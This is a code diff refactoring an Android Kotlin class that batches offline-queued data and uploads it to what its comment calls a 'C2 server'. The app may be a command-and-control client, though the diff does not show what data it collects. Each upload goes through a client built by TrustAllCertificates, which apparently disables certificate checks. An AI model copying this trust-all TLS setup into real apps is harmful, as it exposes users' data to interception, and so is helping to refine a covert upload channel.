@@ -9,6 +9,7 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
+import java.util.concurrent.atomic.AtomicInteger
 
 /**
  * Syncs offline-queued data to the C2 server when connection is restored.
@@ -19,6 +20,7 @@ class DataSyncManager(private val context: Context) {
     companion object {
         private const val TAG = "DataSync"
         private const val BATCH_SIZE = 50
+        private val httpClient = TrustAllCertificates.createClientBuilder().build()
     }
 
     private val queue = OfflineDataQueue(context)
@@ -78,19 +80,19 @@ class DataSyncManager(private val context: Context) {
      * Flush queued data and block until complete.
      */
     suspend fun flushAllSuspend(): Int {
-        var result = 0
+        val result = AtomicInteger(0)
         val job = scope.launch {
             val allQueued = queue.getAllQueued()
             for ((type, items) in allQueued) {
                 val uploaded = uploadBatch(type, items)
-                result += uploaded
+                result.addAndGet(uploaded)
                 if (uploaded == items.size) {
                     queue.clearType(type)
                 }
             }
         }
         job.join()
-        return result
+        return result.get()
     }
 
     private suspend fun uploadBatch(type: String, items: List<OfflineDataQueue.QueueItem>): Int {
@@ -126,27 +128,30 @@ class DataSyncManager(private val context: Context) {
                     put("sync_type", "offline_flush")
                 }
 
-                val client = TrustAllCertificates.createClientBuilder().build()
+                val client = httpClient
                 val request = Request.Builder()
                     .url("${AndroidConfig.apiBaseUrl}/$endpoint")
                     .post(body.toString().toRequestBody("application/json".toMediaType()))
                     .build()
 
-                client.newCall(request).execute().use { response ->
+                val response = client.newCall(request).execute()
+                try {
                     if (response.isSuccessful) {
                         uploaded += batch.size
                         Log.d(TAG, "Uploaded batch of ${batch.size} $type items")
                     } else {
                         Log.w(TAG, "Batch upload failed for $type: ${response.code}")
-                        return uploaded // Stop on failure, will retry next time
+                        continue // Skip failed batch, process remaining
                     }
+                } finally {
+                    response.close()
                 }
 
                 // Small delay between batches to avoid overwhelming server
                 delay(200)
             } catch (e: Exception) {
                 Log.e(TAG, "Batch upload error for $type: ${e.message}")
-                return uploaded
+                continue
             }
         }
 
@@ -171,5 +176,9 @@ class DataSyncManager(private val context: Context) {
      */
     fun persistQueue() {
         queue.persistToDisk()
+    }
+
+    fun cancel() {
+        scope.cancel()
     }
 }
